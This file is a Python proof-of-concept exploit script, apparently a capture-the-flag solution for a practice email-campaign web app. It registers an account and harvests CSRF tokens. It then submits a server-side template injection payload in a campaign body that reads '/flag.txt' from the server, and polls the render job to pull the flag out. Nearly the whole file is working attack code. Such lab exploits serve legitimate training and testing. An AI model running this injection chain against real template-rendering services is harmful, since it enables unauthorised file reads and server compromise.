#!/usr/bin/env python3
import json
import random
import re
import string
import sys
import time
from http.cookiejar import CookieJar
from urllib import parse, request
from urllib.error import HTTPError

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1337"
USERNAME_PREFIX = "poc"
PASSWORD = "poc-password-123"
CSRF_RE = re.compile(r'name="csrf_token" value="([^"]+)"')

cookie_jar = CookieJar()
opener = request.build_opener(request.HTTPCookieProcessor(cookie_jar))


def fetch_text(path: str) -> str:
    with opener.open(BASE_URL + path, timeout=10) as resp:
        return resp.read().decode()


def extract_csrf(html: str) -> str:
    match = CSRF_RE.search(html)
    if not match:
        raise RuntimeError("CSRF token not found in HTML response")
    return match.group(1)


def post_form(path: str, payload: dict) -> str:
    data = parse.urlencode(payload).encode()
    req = request.Request(
        BASE_URL + path,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with opener.open(req, timeout=10) as resp:
        return resp.read().decode()


def post_json(path: str, payload: dict, csrf_token: str) -> dict:
    data = json.dumps(payload).encode()
    req = request.Request(
        BASE_URL + path,
        data=data,
        headers={
            "Content-Type": "application/json",
            "X-CSRF-Token": csrf_token,
        },
        method="POST",
    )
    with opener.open(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def get_json(path: str) -> dict:
    req = request.Request(BASE_URL + path)
    with opener.open(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def register_user() -> str:
    username = f"{USERNAME_PREFIX}-{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
    register_page = fetch_text("/register")
    csrf_token = extract_csrf(register_page)

    post_form(
        "/register",
        {
            "csrf_token": csrf_token,
            "username": username,
            "password": PASSWORD,
            "password_confirm": PASSWORD,
            "next": "/",
        },
    )
    print(f"[+] Registered user: {username}")

    dashboard_html = fetch_text("/")
    return extract_csrf(dashboard_html)


def main() -> int:
    payload = "${open('/flag.txt').read().strip()}"

    try:
        csrf_token = register_user()
        created = post_json(
            "/api/campaigns",
            {
                "title": "PoC campaign",
                "subject": "render-check",
                "body_template": payload,
            },
            csrf_token=csrf_token,
        )
    except HTTPError as err:
        details = err.read().decode(errors="replace")
        print(f"Failed to create campaign: {err.code} {err.reason}")
        if details:
            print(details)
        return 1
    except Exception as err:
        print(f"Failed before campaign creation: {err}")
        return 1

    campaign_id = created["campaign_id"]
    print(f"[+] Campaign created: {campaign_id}")

    try:
        sim = post_json(
            f"/api/campaigns/{campaign_id}/simulate",
            {"target_email": "qa@orbit.local"},
            csrf_token=csrf_token,
        )
    except HTTPError as err:
        details = err.read().decode(errors="replace")
        print(f"Failed to queue simulation: {err.code} {err.reason}")
        if details:
            print(details)
        return 2

    job_id = sim["job_id"]
    print(f"[+] Simulation job queued: {job_id}")

    for _ in range(20):
        try:
            job = get_json(f"/api/jobs/{job_id}")
        except HTTPError as err:
            details = err.read().decode(errors="replace")
            print(f"Failed to fetch job: {err.code} {err.reason}")
            if details:
                print(details)
            return 3

        status = job["status"]
        print(f"[*] Job status: {status}")

        if status == "done":
            output = job.get("output") or ""
            match = re.search(r"practice\{[^}]+\}", output)
            if match:
                print(f"[+] FLAG: {match.group(0)}")
                return 0
            print("[!] Job done, but flag not found in output")
            print(output)
            return 4

        if status == "failed":
            print(f"[!] Job failed: {job.get('error')}")
            return 5

        time.sleep(1)

    print("[!] Timeout waiting for render job")
    return 6


if __name__ == "__main__":
    raise SystemExit(main())
